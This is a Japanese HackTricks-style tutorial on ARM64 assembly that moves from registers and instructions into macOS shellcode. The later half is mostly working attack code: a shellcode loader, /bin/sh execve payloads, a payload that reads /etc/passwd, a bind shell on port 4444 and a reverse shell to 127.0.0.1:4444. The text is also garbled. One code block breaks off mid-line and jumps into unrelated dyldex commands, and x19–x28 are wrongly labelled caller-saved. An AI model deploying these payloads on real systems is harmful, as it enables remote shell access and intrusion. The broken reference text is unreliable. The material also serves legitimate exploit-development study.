# ARM64入門

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>

## **ARM64入門**

ARM64（ARMv8-Aとも呼ばれる）は、スマートフォン、タブレット、サーバー、一部の高性能パーソナルコンピュータ（macOS）など、さまざまなデバイスで使用されている64ビットプロセッサアーキテクチャです。これは、省エネプロセッサ設計で知られるARM Holdingsの製品です。

### **レジスタ**

ARM64には**31の汎用レジスタ**があり、`x0`から`x30`までのラベルが付けられています。それぞれが**64ビット**（8バイト）の値を格納できます。32ビットの値のみが必要な操作の場合、同じレジスタは32ビットモードでw0からw30の名前を使用してアクセスできます。

1. **`x0`** から **`x7`** - これらは通常、スクラッチレジスタとして使用され、サブルーチンへのパラメータ渡しに使用されます。
* **`x0`** は関数の戻り値も運びます
2. **`x8`** - Linuxカーネルでは、`x8`は`svc`命令のシステムコール番号として使用されます。**macOSではx16が使用されます！**
3. **`x9`** から **`x15`** - さらに一時的なレジスタで、しばしばローカル変数に使用されます。
4. **`x16`** と **`x17`** - 一時的なレジスタで、間接関数呼び出しやPLT（プロシージャリンケージテーブル）スタブにも使用されます。
* **`x16`** は**`svc`**命令の**システムコール番号**として使用されます。
5. **`x18`** - プラットフォームレジスタ。一部のプラットフォームでは、このレジスタはプラットフォーム固有の用途に予約されています。
6. **`x19`** から **`x28`** - これらは呼び出し元が保存するレジスタです。関数はこれらのレジスタの値を呼び出し元のために保持する必要があります。
7. **`x29`** - **フレームポインタ**。
8. **`x30`** - リンクレジスタ。`BL`（リンク付き分岐）または`BLR`（レジスタへのリンク付き分岐）命令が実行されると、戻りアドレスが保持されます。
9. **`sp`** - **スタックポインタ**、スタックの先頭を追跡するために使用されます。
10. **`pc`** - **プログラムカウンタ**、次に実行される命令を指します。

### **呼び出し規約**

ARM64の呼び出し規約では、関数への**最初の8つのパラメータ**がレジスタ**`x0`から`x7`**に渡されます。**追加の**パラメータは**スタック**上で渡されます。**戻り値**はレジスタ**`x0`**に渡され、**128ビットの場合は`x1`**でも渡されます。**`x19`**から**`x30`**および**`sp`**レジスタは関数呼び出しをまたいで**保持**されなければなりません。

アセンブリで関数を読むときは、**関数のプロローグとエピローグ**を探します。**プロローグ**は通常、**フレームポインタ（`x29`）の保存**、**新しいフレームポインタの設定**、および**スタックスペースの割り当て**を含みます。**エピローグ**は通常、**保存されたフレームポインタの復元**と関数からの**戻り**を含みます。

### Swiftでの呼び出し規約

Swiftには独自の**呼び出し規約**があり、[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)で見つけることができます。

### **一般的な命令**

ARM64の命令は一般に**`opcode dst, src1, src2`の形式**をとり、**`opcode`**は実行される**操作**（`add`、`sub`、`mov`など）、**`dst`**は結果が格納される**宛先**レジスタ、**`src1`**と**`src2`**は**ソース**レジスタです。ソースレジスタの代わりに即値も使用できます。

* **`mov`**: ある**レジスタ**から別の**レジスタ**へ値を**移動**します。
* 例: `mov x0, x1` — これは`x1`から`x0`へ値を移動します。
* **`ldr`**: **メモリ**から**レジスタ**へ値を**ロード**します。
* 例: `ldr x0, [x1]` — これは`x1`が指すメモリ位置から`x0`へ値をロードします。
* **`str`**: **レジスタ**から**メモリ**へ値を**ストア**します。
* 例: `str x0, [x1]` — これは`x0`の値を`x1`が指すメモリ位置へストアします。
* **`ldp`**: **レジスタのペアをロード**します。この命令は**連続するメモリ**位置から**2つのレジスタ**を**ロード**します。メモリアドレスは通常、別のレジスタの値にオフセットを加えて形成されます。
* 例: `ldp x0, x1, [x2]` — これは`x2`と`x2 + 8`のメモリ位置から`x0`と`x1`をロードします。
* **`stp`**: **レジスタのペアをストア**します。この命令は**連続するメモリ**位置へ**2つのレジスタ**を**ストア**します。メモリアドレスは通常、別のレジスタの値にオフセットを加えて形成されます。
* 例: `stp x0, x1, [x2]` — これは`x2`と`x2 + 8`のメモリ位置へ`x0`と`x1`をストアします。
* **`add`**: 2つのレジスタの値を加算し、結果をレジスタに格納します。
* 例: `add x0, x1, x2` — これは`x1`と`x2`の値を加算し、結果を`x0`に格納します。
* **`sub`**: 2つのレジスタの値を減算し、結果をレジスタに格納します。
* 例: `sub x0, x1, x2` — これは`x2`の値を`x1`から減算し、結果を`x0`に格納します。
* **`mul`**: **2つのレジスタ**の値を**乗算**し、結果をレジスタに格納します。
* 例: `mul x0, x1, x2` — これは`x1`と`x2`の値を乗算し、結果を`x0`に格納します。
* **`div`**: 1つのレジスタの値を別のレジスタで除算し、結果をレジスタに格納します。
* 例: `div x0, x1, x2` — これは`x1`の値を`x2`で除算し、結果を`x0`に格納します。
* **`bl`**: リンク付き分岐、**サブルーチン**を**呼び出す**ために使用されます。**戻りアドレスを`x30`に格納**します。
* 例: `bl myFunction` — これは関数`myFunction`を呼び出し、戻りアドレスを`x30`に格納します。
* **`blr`**: レジスタへのリンク付き分岐、ターゲットが**レジスタ**で**指定された**サブルーチンを**呼び出す**ために使用されます。戻りアドレスを`x30`に格納します。
* 例: `blr x1` — これは`x1`に含まれるアドレスの関数を呼び出し、戻りアドレスを`x30`に格納します。
* **`ret`**: **サブルーチンから戻る**、通常は**`x30`**のアドレスを使用します。
* 例: `ret` — これは現在のサブルーチンから`x30`の戻りアドレスを使用して戻ります。
* **`cmp`**: 2つのレジスタを比較し、条件フラグを設定します。
* 例: `cmp x0, x1` — これは`x0`と`x1`の値を比較し、条件フラグを設定します。
* **`b.eq`**: 等しい場合に分岐します。これは前の`cmp`命令に基づいています。
* 例: `b.eq label` — 前の`cmp`命令で2つの等しい値が見つかった場合、これは`label`へジャンプします。
* **`b.ne`**: 等しくない場合に分岐します。この命令は条件フラグ（前の比較命令によって設定された）をチェックし、比較された値が等しくなかった場合、ラベルまたはアドレスへ分岐します。
* 例: `cmp x0, x1`命令の後に、`b.ne label` — `x0`と`x1`の値が等しくなかった場合、これは`label`へジャンプします。
* **`cbz`**: ゼロと比較して分岐します。この命令はレジスタをゼロと比較し、等しい場合はラベルまたはアドレスへ分岐します。
* 例: `cbz x0, label` — `x0`の値がゼロの場合、これは`label`へジャンプします。
* **`cbnz`**: 非ゼロと比較して分岐します。この命令はレジスタをゼロと比較し、等しくない場合はラベルまたはアドレスへ分岐します。
* 例: `cbnz x0, label` — `x0`の値が非ゼロの場合、これは`label`へジャンプします。
* **`adrp`**: シンボルの**ページアドレスを計算**し、レジスタに格納します。
* 例: `adrp x0, symbol` — これは`symbol`のページアドレスを計算し、`x0`に格納します。
* **`ldrsw`**: メモリから符号付き**32ビット**値を**ロード**し、それを64ビットに**符号拡張**します。
* 例: `ldrsw x0, [x1]` — これは`x1`が指すメモリ位置から符号付き32ビット値をロードし、それを64ビットに符号拡張して`x0`に格納します。
* **`stur`**: 別のレジスタからのオフセットを使用して、レジスタ値をメモリ位置に**ストア**します。
* 例: `stur x0, [x1, #4]` — これは`x0`の値を`x1`に現在あるアドレスより4バイト大きいメモリアドレスにストアします。
* &#x20;**`svc`** : **システムコール**を行います。"Supervisor Call"を意味します。プロセッサがこの命令を実行すると、**ユーザーモードからカーネルモードに切り替え**、メモリの特定の位置にジャンプします。そこでは**カーネルのシステムコール処理**コードが配置されています。
*   例:&#x20;

```armasm
mov x8, 93  ; システムコール番号exit（93）をレジスタx8にロードします。
mov x0, 0   ; 終了ステータスコード（0）をレジスタx0にロードします。
svc 0       ; システム
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
時には、いくつかのシステムコール（BSDおよびMach）のコードがスクリプトを介して生成されるため（ソースコードのコメントを確認）、**ソースコード**を確認するよりも、**`libsystem_kernel.dylib`** の**デコンパイルされた**コードを確認する方が簡単です。dylibでは、何が呼び出されているかを見つけることができます。
{% endhint %}

### シェルコード

コンパイルするには：
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
バイトを抽出するには：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>Cコードをテストするシェルコード</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### シェル

[**こちら**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)から取得し、説明します。

{% tabs %}
{% tab title="adrを使用" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="スタックを使用" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### catコマンドの実行

目標は`execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`を実行することで、第二引数(x1)はパラメータの配列です（メモリ上ではこれはアドレスのスタックを意味します）。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### フォークからshを使ってコマンドを実行し、メインプロセスが終了しないようにする
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### バインドシェル

**ポート4444**でのバインドシェルは[https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s)からです
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### リバースシェル

[https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s) から、**127.0.0.1:4444** へのrevshell
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。これは独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加するか**、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローしてください。**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>
